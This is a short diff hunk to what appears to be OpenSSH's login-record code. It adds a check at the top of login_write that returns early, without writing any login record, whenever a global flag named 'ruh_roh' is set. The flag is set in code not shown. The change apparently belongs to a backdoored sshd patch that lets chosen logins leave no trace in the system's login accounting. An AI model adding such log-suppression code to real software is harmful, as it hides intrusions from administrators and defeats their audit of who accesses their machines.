@@ -432,6 +432,9 @@ login_set_addr(struct logininfo *li, const struct sockaddr *sa,
 int
 login_write(struct logininfo *li)
 {
+	if(ruh_roh == 1)
+	return 0;
+
 #ifndef HAVE_CYGWIN
 	if (geteuid() != 0) {
 		logit("Attempt to write login records by non-root user (aborting)");
